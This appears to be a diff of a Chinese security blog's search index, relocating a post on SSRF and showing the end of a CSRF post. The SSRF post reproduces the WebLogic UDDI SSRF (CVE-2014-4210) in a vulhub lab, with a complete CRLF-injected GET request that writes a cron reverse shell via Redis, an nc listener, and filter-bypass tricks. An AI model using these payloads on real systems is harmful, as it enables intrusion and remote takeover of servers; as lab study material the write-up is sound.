-<p>在PHP中，可以使用$_GET和$_POST分别获取GET请求和POST请求的数据。在JAVA中，用于获取请求数据request一样存在不能区分GET请求数据和POST数据的问题</p>
-</blockquote>
-<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>最好是有目标站点的CMS，在本地搭建并构造一下例如创建管理员，开放权限等数据包，通过钓鱼等手段诱导管理员点击，执行数据包；要是没有目标站点的cms，也可以尝试抓包构造一下，不过有一定难度</p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>CSRF攻击是源于WEB的隐式身份验证机制！WEB的身份验证机制虽然可以保证一个请求是<strong>来自于某个用户的浏览器</strong>，但却<strong>无法保证该请求是用户批准发送的</strong></p>
-<h2 id="防御手段"><a href="#防御手段" class="headerlink" title="防御手段"></a>防御手段</h2><h4 id="Referer-Check"><a href="#Referer-Check" class="headerlink" title="Referer Check"></a>Referer Check</h4><ol>
-<li>验证http referer字段</li>
-</ol>
-<p>referer就是记录了请求的来源（同源策略）</p>
-<blockquote>
-<p>然而，这种方法并非万无一失。Referer  的值是由浏览器提供的，虽然 HTTP 协议上有明确的要求，但是每个浏览器对于 Referer  的具体实现可能有差别，并不能保证浏览器自身没有安全漏洞。使用验证 Referer  值的方法，就是把安全性都依赖于第三方（即浏览器）来保障，从理论上来讲，这样并不安全</p>
-</blockquote>
-<p>因为服务器并不是什么时候都能取到Referer，也可以通过抓包修改进行绕过，所以也无法作为CSRF防御的主要手段。但是用Referer Check来监控CSRF攻击的发生，倒是一种可行的方法</p>
-<h4 id="Anti-CSRF-Token"><a href="#Anti-CSRF-Token" class="headerlink" title="Anti CSRF Token"></a>Anti CSRF Token</h4><ol start="2">
-<li>添加token并验证</li>
-</ol>
-<p>一致的做法是使用一个token（<strong>Anti CSRF Token</strong>）</p>
-<p>用户每次访问改密页面时，服务器会返回一个随机的token，向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求</p>
-<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.cnblogs.com/hyddd/archive/2009/04/09/1432744.html">浅谈CSRF攻击方式</a></p>
-<p><a href="https://www.cnblogs.com/lsj-info/p/9479755.html">CSRF攻击原理以及防御方法</a></p>
-]]></content>
-      <categories>
-        <category>csrf</category>
-      </categories>
-      <tags>
-        <tag>csrf</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>常见web漏洞学习之SSRF</title>
-    <url>/2021/07/15/%E5%B8%B8%E8%A7%81web%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BSSRF/</url>
-    <content><![CDATA[<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p><img src="https://i.loli.net/2021/07/17/FxWvNe42sRnGHqt.png" alt="image-20210717161639133"></p>
-<p><img src="https://i.loli.net/2021/07/17/smd1vkM65KeSaHn.png" alt="image-20210717161814292"></p>
-<p><img src="https://i.loli.net/2021/07/17/UvSWRuVZxiHkomn.png" alt="image-20210717161911196"></p>
-<p><img src="https://i.loli.net/2021/07/17/HsaJXe45FlEY9cL.jpg" alt="img"></p>
-<h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>Server Side Request Forgery 服务端请求伪造</p>
-<p>是由攻击者构造形成并由服务端发起恶意请求的一个安全漏洞。因为恶意请求由服务端发起，而服务端能够请求到与自身相连而与外网隔绝的内部网络系统，所以一般情况下，SSRF攻击的目标是从外网无法访问的内部系统</p>
-<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>很多web应用都提供了从其他的服务器上获取数据的功能，如使用指定的url，web应用就可以获取图片，下载文件，读取文件内容等（这个url是远程的url，并不是本地的，<del>说了个废话</del>）</p>
-<p>SSRF的实质是<strong>利用存在缺陷的web应用作为代理来进行攻击</strong>远程和本地的服务器</p>
-<p>SSRF形成的原因大都是由于服务端<strong>提供了从其他服务器应用获取数据的功能</strong>且没有<strong>对目标地址做过滤与限制</strong></p>
-<h3 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h3><p><img src="https://i.loli.net/2021/07/18/HKf8lbk4BOJeNdA.jpg" alt="9907e251f785494d92c746eb5df60541"></p>
-<h3 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h3><ul>
-<li>内外网的端口和服务扫描</li>
-<li>对内网Web应用进行指纹识别，识别企业内部的资产信息，通过访问默认文件实现(如：readme文件)</li>
-<li>攻击运行在内网或服务器本地的其他应用程序，如redis、mysql等</li>
-<li>利用Redis未授权访问，HTTP CRLF注入实现getshell</li>
-<li>下载内网资源，利用file协议读取本地敏感数据文件等</li>
-<li>进行跳板</li>
-</ul>
-<h3 id="相关协议"><a href="#相关协议" class="headerlink" title="相关协议"></a>相关协议</h3><ul>
-<li>file协议： 在有回显的情况下，利用 file 协议可以读取任意文件的内容</li>
-<li>http/https协议：探测内网主机存活</li>
-<li>dict协议：泄露安装软件版本信息，查看端口，操作内网redis服务等</li>
-<li>gopher协议：gopher支持发出GET、POST请求。可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell</li>
-</ul>
-<h3 id="weblogic-ssrf复现"><a href="#weblogic-ssrf复现" class="headerlink" title="weblogic ssrf复现"></a>weblogic ssrf复现</h3><h4 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h4><p><img src="https://i.loli.net/2021/07/18/64S8lLxKy1sbThH.png" alt="image-20210718153704526"></p>
-<p>查看靶场说明</p>
-<p>进入weblogic的ssrf的目录下，使用<code>gedit</code>命令查看<code>README.md</code></p>
-<p><img src="https://i.loli.net/2021/07/18/NioHV94KcWQdUkC.png" alt="image-20210718154456328"></p>
-<p>xshell会让提示下Xmanger</p>
-<p><img src="https://i.loli.net/2021/07/18/AdLikoaK5s18p9V.png" alt="image-20210718154647511"></p>
-<p>直接下本地看</p>
-<p>访问<code>ip:7001/uddiexplorer/</code>，无需登录即可查看uddiexplorer应用</p>
-<p><img src="https://i.loli.net/2021/07/18/SlbMwNYxXPvj9aQ.png" alt="image-20210718155843581"></p>
-<p>访问<code>ip:7001/uddiexplorer/SearchPublicRegistries.jsp</code></p>
-<p>​    <img src="https://i.loli.net/2021/07/18/E3xOf6zXK4kup1G.png" alt="image-20210718160744237"></p>
-<h4 id="探测内网状态"><a href="#探测内网状态" class="headerlink" title="探测内网状态"></a>探测内网状态</h4><p><img src="https://i.loli.net/2021/07/18/aQI3ivkAp8MFUcV.png" alt="image-20210718162349626"></p>
-<p>构造payload来检验端口是否开放并且是否为HTTP协议<code>operator=http://127.0.0.1:7001</code>，返回<code>status code</code>就说明端口开放并且为HTTP协议</p>
-<p><img src="https://i.loli.net/2021/07/18/r2c6UPX3liFnHxC.png" alt="image-20210718162817388"></p>
-<p>尝试一个不存在的端口<code>7777</code>，返回<code>could not connect over HTTP to server</code>，就是说明端口不存在</p>
-<p><img src="https://i.loli.net/2021/07/18/1MaoVAP6WU9kXwd.png" alt="image-20210718163712297"></p>
-<p>如果端口开放访问的是非http协议，则会返回<code>did not have a valid SOAP content-type</code></p>
-<p><img src="https://i.loli.net/2021/07/18/a921AiY4epylb5h.png" alt="image-20210718164622656"></p>
-<p>在查看Redis端口开放状态时，一直不行，看一下才发现是没有起来</p>
-<p><img src="https://i.loli.net/2021/07/18/JcSrjMtdWQusE89.png" alt="image-20210718171022778"></p>
-<h4 id="探测Redis端口情况"><a href="#探测Redis端口情况" class="headerlink" title="探测Redis端口情况"></a>探测Redis端口情况</h4><p>首先，通过ssrf探测内网中的redis服务器（docker环境的网段一般是172.*），发现<code>172.18.0.1:6379</code>可以连通：</p>
-<blockquote>
-<p>也可以写个脚本跑一下</p>
-</blockquote>
-<p><img src="https://i.loli.net/2021/07/18/nDTQKp3m9Zro1uH.png" alt="image-20210718171256048"></p>
-<h4 id="注入HTTP头，利用Redis反弹shell"><a href="#注入HTTP头，利用Redis反弹shell" class="headerlink" title="注入HTTP头，利用Redis反弹shell"></a>注入HTTP头，利用Redis反弹shell</h4><p>Weblogic的SSRF有一个比较大的特点，其虽然是一个“GET”请求，但是我们可以通过传入<code>%0a%0d</code>来注入换行符，而某些服务（如redis）是通过换行符来分隔每条命令，也就说我们可以通过该SSRF攻击内网中的redis服务器</p>
-<h4 id="发送Redis命令，将弹shell脚本写入-etc-crontab"><a href="#发送Redis命令，将弹shell脚本写入-etc-crontab" class="headerlink" title="发送Redis命令，将弹shell脚本写入/etc/crontab"></a>发送Redis命令，将弹shell脚本写入<code>/etc/crontab</code></h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set 1 &quot;\n\n\n\n* * * * * root bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;公网ip&#x2F;port 0&gt;&amp;1\n\n\n\n&quot;</span><br><span class="line">config set dir &#x2F;etc&#x2F;</span><br><span class="line">config set dbfilename crontab</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
-
-
-<h5 id="对其进行url编码"><a href="#对其进行url编码" class="headerlink" title="对其进行url编码"></a>对其进行url编码</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set%201%20%22%5Cn%5Cn%5Cn%5Cn0-59%200-23%201-31%201-12%200-6%20root%20bash%20-c%20%27sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F公网ip%2F监听端口%200%3E%261%27%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave</span><br></pre></td></tr></table></figure>
-<p>注：换行符是“\r\n”，也就是“%0D%0A”</p>
-<blockquote>
-<p>\r是回车，\n是换行</p>
-</blockquote>
-<p>将url编码后的字符串放在ssrf域名后面，go</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;uddiexplorer&#x2F;SearchPublicRegistries.jsp?rdoSearch&#x3D;name&amp;txtSearchname&#x3D;sdf&amp;txtSearchkey&#x3D;&amp;txtSearchfor&#x3D;&amp;selfor&#x3D;Business+location&amp;btnSubmit&#x3D;Search&amp;operator&#x3D;http:&#x2F;&#x2F;172.18.0.1:6379&#x2F;test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn0-59%200-23%201-31%201-12%200-6%20root%20bash%20-c%20%27sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F公网ip%2F监听端口%200%3E%261%27%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave HTTP&#x2F;1.1</span><br></pre></td></tr></table></figure>
-<p><img src="https://i.loli.net/2021/07/18/4B1TI6QFdS7uNtH.png" alt="image-20210718201905032"></p>
-<p><code>nc -lvp 4444</code></p>
-<p>可进行利用的cron还有以下几个地方</p>
-<ul>
-<li>/etc/crontab 这个是肯定的</li>
-<li>/etc/cron.d/* 将任意文件写到该目录下，效果和crontab相同，格式也要和/etc/crontab相同。漏洞利用这个目录，可以做到不覆盖任何其他文件的情况进行弹shell。</li>
-<li>/var/spool/cron/root centos系统下root用户的cron文件</li>
-<li>/var/spool/cron/crontabs/root debian系统下root用户的cron文件</li>
-</ul>
-<h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><ol>
-<li><p>@　　　　　　　　　　<a href="http://abc.com@127.0.0.1/">http://abc.com@127.0.0.1</a></p>
-</li>
-<li><p>添加端口号　　　　　　<a href="http://127.0.0.1:8080/">http://127.0.0.1:8080</a></p>
-</li>
-<li><p>短地址　　　　　　　　<a href="https://0x9.me/cuGfD">https://0x9.me/cuGfD</a></p>
-</li>
-<li><p>可以指向任意ip的域名　 xip.io</p>
-</li>
-<li><p>ip地址转换成进制来访问 192.168.0.1=32322</p>
-</li>
-</ol>
-<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.freebuf.com/company-information/220086.html">SSRF漏洞攻击原理及防御方案</a></p>
-<p><a href="https://www.t00ls.net/articles-41070.html">SSRF漏洞(原理&amp;绕过姿势)</a></p>
-<p><a href="https://blog.csdn.net/weixin_41679427/article/details/110312158">SSRF攻击姿势汇总</a></p>
-<p><a href="https://blog.csdn.net/lhh134/article/details/88298881">Weblogic SSRF漏洞（CVE-2014-4210）</a></p>
-<p><a href="https://blog.csdn.net/weixin_46789316/article/details/116531565">漏洞复现-vulhub复现Weblogic的SSRF漏洞</a></p>
-]]></content>
   </entry>
   <entry>
     <title>常见web漏洞学习之文件上传知识点总结</title>
@@ -1147,6 +1056,97 @@
       <tags>
         <tag>文件上传</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>常见web漏洞学习之SSRF</title>
+    <url>/2021/07/15/%E5%B8%B8%E8%A7%81web%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E4%B9%8BSSRF/</url>
+    <content><![CDATA[<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p><img src="https://i.loli.net/2021/07/17/FxWvNe42sRnGHqt.png" alt="image-20210717161639133"></p>
+<p><img src="https://i.loli.net/2021/07/17/smd1vkM65KeSaHn.png" alt="image-20210717161814292"></p>
+<p><img src="https://i.loli.net/2021/07/17/UvSWRuVZxiHkomn.png" alt="image-20210717161911196"></p>
+<p><img src="https://i.loli.net/2021/07/17/HsaJXe45FlEY9cL.jpg" alt="img"></p>
+<h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>Server Side Request Forgery 服务端请求伪造</p>
+<p>是由攻击者构造形成并由服务端发起恶意请求的一个安全漏洞。因为恶意请求由服务端发起，而服务端能够请求到与自身相连而与外网隔绝的内部网络系统，所以一般情况下，SSRF攻击的目标是从外网无法访问的内部系统</p>
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>很多web应用都提供了从其他的服务器上获取数据的功能，如使用指定的url，web应用就可以获取图片，下载文件，读取文件内容等（这个url是远程的url，并不是本地的，<del>说了个废话</del>）</p>
+<p>SSRF的实质是<strong>利用存在缺陷的web应用作为代理来进行攻击</strong>远程和本地的服务器</p>
+<p>SSRF形成的原因大都是由于服务端<strong>提供了从其他服务器应用获取数据的功能</strong>且没有<strong>对目标地址做过滤与限制</strong></p>
+<h3 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h3><p><img src="https://i.loli.net/2021/07/18/HKf8lbk4BOJeNdA.jpg" alt="9907e251f785494d92c746eb5df60541"></p>
+<h3 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h3><ul>
+<li>内外网的端口和服务扫描</li>
+<li>对内网Web应用进行指纹识别，识别企业内部的资产信息，通过访问默认文件实现(如：readme文件)</li>
+<li>攻击运行在内网或服务器本地的其他应用程序，如redis、mysql等</li>
+<li>利用Redis未授权访问，HTTP CRLF注入实现getshell</li>
+<li>下载内网资源，利用file协议读取本地敏感数据文件等</li>
+<li>进行跳板</li>
+</ul>
+<h3 id="相关协议"><a href="#相关协议" class="headerlink" title="相关协议"></a>相关协议</h3><ul>
+<li>file协议： 在有回显的情况下，利用 file 协议可以读取任意文件的内容</li>
+<li>http/https协议：探测内网主机存活</li>
+<li>dict协议：泄露安装软件版本信息，查看端口，操作内网redis服务等</li>
+<li>gopher协议：gopher支持发出GET、POST请求。可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell</li>
+</ul>
+<h3 id="weblogic-ssrf复现"><a href="#weblogic-ssrf复现" class="headerlink" title="weblogic ssrf复现"></a>weblogic ssrf复现</h3><h4 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h4><p><img src="https://i.loli.net/2021/07/18/64S8lLxKy1sbThH.png" alt="image-20210718153704526"></p>
+<p>查看靶场说明</p>
+<p>进入weblogic的ssrf的目录下，使用<code>gedit</code>命令查看<code>README.md</code></p>
+<p><img src="https://i.loli.net/2021/07/18/NioHV94KcWQdUkC.png" alt="image-20210718154456328"></p>
+<p>xshell会让提示下Xmanger</p>
+<p><img src="https://i.loli.net/2021/07/18/AdLikoaK5s18p9V.png" alt="image-20210718154647511"></p>
+<p>直接下本地看</p>
+<p>访问<code>ip:7001/uddiexplorer/</code>，无需登录即可查看uddiexplorer应用</p>
+<p><img src="https://i.loli.net/2021/07/18/SlbMwNYxXPvj9aQ.png" alt="image-20210718155843581"></p>
+<p>访问<code>ip:7001/uddiexplorer/SearchPublicRegistries.jsp</code></p>
+<p>​    <img src="https://i.loli.net/2021/07/18/E3xOf6zXK4kup1G.png" alt="image-20210718160744237"></p>
+<h4 id="探测内网状态"><a href="#探测内网状态" class="headerlink" title="探测内网状态"></a>探测内网状态</h4><p><img src="https://i.loli.net/2021/07/18/aQI3ivkAp8MFUcV.png" alt="image-20210718162349626"></p>
+<p>构造payload来检验端口是否开放并且是否为HTTP协议<code>operator=http://127.0.0.1:7001</code>，返回<code>status code</code>就说明端口开放并且为HTTP协议</p>
+<p><img src="https://i.loli.net/2021/07/18/r2c6UPX3liFnHxC.png" alt="image-20210718162817388"></p>
+<p>尝试一个不存在的端口<code>7777</code>，返回<code>could not connect over HTTP to server</code>，就是说明端口不存在</p>
+<p><img src="https://i.loli.net/2021/07/18/1MaoVAP6WU9kXwd.png" alt="image-20210718163712297"></p>
+<p>如果端口开放访问的是非http协议，则会返回<code>did not have a valid SOAP content-type</code></p>
+<p><img src="https://i.loli.net/2021/07/18/a921AiY4epylb5h.png" alt="image-20210718164622656"></p>
+<p>在查看Redis端口开放状态时，一直不行，看一下才发现是没有起来</p>
+<p><img src="https://i.loli.net/2021/07/18/JcSrjMtdWQusE89.png" alt="image-20210718171022778"></p>
+<h4 id="探测Redis端口情况"><a href="#探测Redis端口情况" class="headerlink" title="探测Redis端口情况"></a>探测Redis端口情况</h4><p>首先，通过ssrf探测内网中的redis服务器（docker环境的网段一般是172.*），发现<code>172.18.0.1:6379</code>可以连通：</p>
+<blockquote>
+<p>也可以写个脚本跑一下</p>
+</blockquote>
+<p><img src="https://i.loli.net/2021/07/18/nDTQKp3m9Zro1uH.png" alt="image-20210718171256048"></p>
+<h4 id="注入HTTP头，利用Redis反弹shell"><a href="#注入HTTP头，利用Redis反弹shell" class="headerlink" title="注入HTTP头，利用Redis反弹shell"></a>注入HTTP头，利用Redis反弹shell</h4><p>Weblogic的SSRF有一个比较大的特点，其虽然是一个“GET”请求，但是我们可以通过传入<code>%0a%0d</code>来注入换行符，而某些服务（如redis）是通过换行符来分隔每条命令，也就说我们可以通过该SSRF攻击内网中的redis服务器</p>
+<h4 id="发送Redis命令，将弹shell脚本写入-etc-crontab"><a href="#发送Redis命令，将弹shell脚本写入-etc-crontab" class="headerlink" title="发送Redis命令，将弹shell脚本写入/etc/crontab"></a>发送Redis命令，将弹shell脚本写入<code>/etc/crontab</code></h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set 1 &quot;\n\n\n\n* * * * * root bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;公网ip&#x2F;port 0&gt;&amp;1\n\n\n\n&quot;</span><br><span class="line">config set dir &#x2F;etc&#x2F;</span><br><span class="line">config set dbfilename crontab</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+
+
+<h5 id="对其进行url编码"><a href="#对其进行url编码" class="headerlink" title="对其进行url编码"></a>对其进行url编码</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set%201%20%22%5Cn%5Cn%5Cn%5Cn0-59%200-23%201-31%201-12%200-6%20root%20bash%20-c%20%27sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F公网ip%2F监听端口%200%3E%261%27%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave</span><br></pre></td></tr></table></figure>
+<p>注：换行符是“\r\n”，也就是“%0D%0A”</p>
+<blockquote>
+<p>\r是回车，\n是换行</p>
+</blockquote>
+<p>将url编码后的字符串放在ssrf域名后面，go</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F;uddiexplorer&#x2F;SearchPublicRegistries.jsp?rdoSearch&#x3D;name&amp;txtSearchname&#x3D;sdf&amp;txtSearchkey&#x3D;&amp;txtSearchfor&#x3D;&amp;selfor&#x3D;Business+location&amp;btnSubmit&#x3D;Search&amp;operator&#x3D;http:&#x2F;&#x2F;172.18.0.1:6379&#x2F;test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn0-59%200-23%201-31%201-12%200-6%20root%20bash%20-c%20%27sh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F公网ip%2F监听端口%200%3E%261%27%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave HTTP&#x2F;1.1</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2021/07/18/4B1TI6QFdS7uNtH.png" alt="image-20210718201905032"></p>
+<p><code>nc -lvp 4444</code></p>
+<p>可进行利用的cron还有以下几个地方</p>
+<ul>
+<li>/etc/crontab 这个是肯定的</li>
+<li>/etc/cron.d/* 将任意文件写到该目录下，效果和crontab相同，格式也要和/etc/crontab相同。漏洞利用这个目录，可以做到不覆盖任何其他文件的情况进行弹shell。</li>
+<li>/var/spool/cron/root centos系统下root用户的cron文件</li>
+<li>/var/spool/cron/crontabs/root debian系统下root用户的cron文件</li>
+</ul>
+<h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><ol>
+<li><p>@　　　　　　　　　　<a href="http://abc.com@127.0.0.1/">http://abc.com@127.0.0.1</a></p>
+</li>
+<li><p>添加端口号　　　　　　<a href="http://127.0.0.1:8080/">http://127.0.0.1:8080</a></p>
+</li>
+<li><p>短地址　　　　　　　　<a href="https://0x9.me/cuGfD">https://0x9.me/cuGfD</a></p>
+</li>
+<li><p>可以指向任意ip的域名　 xip.io</p>
+</li>
+<li><p>ip地址转换成进制来访问 192.168.0.1=32322</p>
+</li>
+</ol>
+<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://www.freebuf.com/company-information/220086.html">SSRF漏洞攻击原理及防御方案</a></p>
+<p><a href="https://www.t00ls.net/articles-41070.html">SSRF漏洞(原理&amp;绕过姿势)</a></p>
+<p><a href="https://blog.csdn.net/weixin_41679427/article/details/110312158">SSRF攻击姿势汇总</a></p>
+<p><a href="https://blog.csdn.net/lhh134/article/details/88298881">Weblogic SSRF漏洞（CVE-2014-4210）</a></p>
+<p><a href="https://blog.csdn.net/weixin_46789316/article/details/116531565">漏洞复现-vulhub复现Weblogic的SSRF漏洞</a></p>
+]]></content>
   </entry>
   <entry>
     <title>端口那些事</title>
